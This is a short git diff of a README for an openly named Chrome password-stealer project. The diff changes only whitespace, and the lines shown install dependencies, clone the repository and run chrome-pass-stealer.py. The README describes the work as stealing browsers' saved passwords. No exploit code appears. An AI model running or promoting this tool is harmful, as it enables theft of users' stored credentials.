@@ -22,9 +22,9 @@ pip install pysqlite3
 pip install pywin32                                                                                                                                         
 pip install pycrypto                                                                                                                                       
 pip install pytest-shutil                                                                                                                                   
-git clone https://github.com/kunalmannu/Chrome-Pass-Stealer.git
-cd Chrome-Pass-Stealer
-python3 chrome-pass-stealer.py
+git clone https://github.com/kunalmannu/Chrome-Pass-Stealer.git                                                                                           
+cd Chrome-Pass-Stealer                                                                                                                                     
+python3 chrome-pass-stealer.py                                                                                                                             
 
 # Idea
 So Guyz On Day I Was Working On Stealing Browser's Saved Password
